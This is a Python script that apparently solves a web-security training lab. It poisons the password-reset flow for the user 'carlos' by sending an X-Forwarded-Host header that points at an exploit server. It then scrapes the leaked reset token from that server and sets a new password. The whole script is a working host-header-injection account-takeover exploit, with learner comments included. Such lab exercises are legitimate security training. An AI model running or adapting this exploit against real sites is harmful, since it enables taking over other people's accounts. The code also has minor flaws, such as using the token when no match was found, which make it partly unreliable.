import requests
import urllib3
#from bs4 import BeautifulSoup
import re

# Suppress only the InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies={"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

reset_url = "https://0aa500520494408781089828007e00ff.web-security-academy.net/"
exploit_url="https://exploit-0a170015049d40c8815c979f01b300f7.exploit-server.net/" #/email


data = {"username":"carlos"}
headers = {"X-Forwarded-Host":exploit_url}
reponse = requests.post(reset_url+ "forgot-password",verify=False,headers=headers,proxies=proxies,data=data)

# Now grab the access token from the /email endpoint from html 


response_exploit = requests.post(exploit_url+"email",verify=False,proxies=proxies)
# Step 2: Parse the HTML
#soup = BeautifulSoup(response_exploit.text, 'html.parser')
#print(soup)
#token_meta = soup.find('href', attrs={'temp-forgot-password-token': 'access-token'})
#print(token_meta)

# having dout here what is the difference betweeen re.search and research.findall 

# gpt answ re.findall() Finds all matches of the pattern in the string. Returns a list of strings (or tuples if you use groups).
#re.search() Finds the first match of the pattern. Returns a match object, or None if no match.

match = re.search(r'temp-forgot-password-token=([a-z0-9]+)', response_exploit.text)
# print(match)

#temp-forgot-password-token=abc123xyz

#match.group(1) → gives you just what’s inside the first set of 

#abc123xyz

if match :
    token = match.group(1)
    print(token)

data1 = {"temp-forgot-password-token":token,"username":"carlos","new-password-1":"jester@123","new-password-2":"jester@123"}

carlos_password = requests.post(reset_url+"forgot-password?temp-forgot-password-token="+token,verify=False,proxies=proxies,params=token,data=data1)